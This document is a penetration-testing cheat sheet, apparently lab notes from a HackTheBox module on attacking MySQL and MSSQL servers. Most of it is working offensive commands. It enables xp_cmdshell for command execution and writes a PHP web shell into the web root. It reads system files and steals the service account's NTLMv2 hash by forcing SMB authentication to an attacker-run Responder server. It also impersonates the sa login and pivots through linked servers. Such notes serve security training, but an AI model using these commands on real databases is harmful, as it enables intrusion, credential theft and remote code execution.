# SQL Syntax

```
MySQL default system schemas/databases:

    mysql - is the system database that contains tables that store information required by the MySQL server
    information_schema - provides access to database metadata
    performance_schema - is a feature for monitoring MySQL Server execution at a low level
    sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:

    master - keeps the information for an instance of SQL Server.
    msdb - used by SQL Server Agent.
    model - a template database copied for each new database.
    resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
    tempdb - keeps temporary objects for SQL queries.
```
```
bluechat@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
bluechat@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
bluechat@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
bluechat@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 (use -windows-auth if authentication fails)

C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

## Show Databases
```sql
mysql> 
SHOW DATABASES; 

sqlcmd> 
SELECT name FROM master.dbo.sysdatabases

Database:

information_schema
htbusers
```
```sql
mysql> 
USE htbusers;
SHOW TABLES;

sqlcmd> 
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES


Tables_in_htbusers:

actions
permissions
permissions_roles
permissions_users
roles
roles_users
settings
users
```
```sql
mysql> 
SELECT * FROM users;


id		username		password		date_joined

1		admin			p@ssword		2020-07-02 00:00:00
2		administrator	adm1n_passwd	2020-07-02 11:30:50
```

## Executing Commands

It's possible to use SQL databases to execute system commands or create the elements to do so. MSSQL has `extended stored procedures` called `xp_cmdshell` which allows us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

	- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the `Policy-Based Management` or by executing `sp_configure`.
	- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server sevice account.
	- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed.

## XP_CMDSHELL

sqlcmd> xp_cmdshell 'whoami'
sqlcmd> GO

If `xp_cmdshell` is not enabled, we can enable it, if we have the right privileges:

```mssql
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO

```

Other methods For MSSQL: 
	- Extended Stored Procedures
	- CLR Assemblies
	- SQL Server Agent Jobs
	- External Scripts

Respectively, MySQL supports User defined Functions, letting us execute C/CPP code as a function with SQL.

## MySQL - Write Local File

```sql
mysql> SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE '/var/www/html/webshell.php';
```
## secure_file_priv

This global system variable limits the effect of data import and export operations, such as LOAD DATA and SELECT ... INTO OUTFILE statements and the LOAD_FILE() function to those with the FILE privilege set.

```sql
mysql> SHOW variables LIKE "secure_file_priv";
```

`Respectively`, To write files with MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges.

## Enable

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

## Create File

```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, "C:\inetpub\wwwroot\webshell.php", 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, "<?php echo shell_exec($_GET['c']); ?>"
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## Read Local Files

### MSSQL

```sql
SELECT * FROM OPENROWSET(BULK N"C:\Windows\System32\drivers\etc\hosts", SINGLE_CLOB) AS Contents
GO
```

### MySQL

```sql
SELECT LOAD_FILE("/etc/passwd");
```

## Capture MSSQL Service Hash using XP_SUBDIRS or XP_DIRTREE

We can use undocumented stored procedures which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
When we use one of these stored procedures and point it to our SMB server, the directory listening functionallity will force the server to authenticate and send the NTLKMv2 hash of the service account that's running the SQL Server.

```sql
start Responder

EXEC master..xp_dirtree "\\10.10.110.17\share\"
GO
```

```sql
EXEC mast..xp_subdirs "\\10.10.110.17\share\"
GO
```

XP_SUBDIRS Hash stealing with Responder and Impacket

```
sudo responder -I tun0
 or
sudo impacket-smbserver share ./ -smb2support
```

## Impersonate Existing Users with MSSQL

SQL has a special permission `IMPERSONATE`. Sysadmins can impersonate anyone by default, but non-admins must be explicitly assigned permissions.

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

### Verify if Current User has sysadmin role

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

1 = YES, 0 = NO

### Impersonate User That Has Sysadmin

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

> Note: It's recommened to run EXECUTE AS LOGIN within the master DB because all users have access to it by default, but not always other databases.
> Also, even if a particular user is not sysadmin they may still have privileges to certain databases that are not accessible by other users.

Use REVERT to switch back to our previous user.

## Communicate with Other Databases with MSSQL

We can move laterally if there are SQL Servers linked.

### Identify Linked Servers in MSSQL

```sql
SELECT srvname, isremote FROM sysservers
GO
```

### Identify User Linked with Remote Server

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```
